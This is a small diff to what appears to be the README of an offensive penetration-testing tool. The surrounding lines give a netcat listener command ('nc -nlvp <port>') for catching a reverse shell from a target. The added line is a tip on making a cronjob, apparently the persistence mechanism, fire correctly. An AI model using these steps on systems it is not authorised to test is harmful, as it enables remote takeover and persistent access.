@@ -162,6 +162,8 @@ if you want to catch the reverse shell, on your local box type:
 
 `nc -nlvp <port>` the same port your used when you ran the terminator just now (-x <any_port>)
 
+*if cronjob is not working, you might need to run 'crontab -e' then just add a space under the cronjob, and exit the file with 'Ctrl+x', 'y', 'enter'*
+
 # report
 now that we have terminated the target machine, we can create a report for our client
 
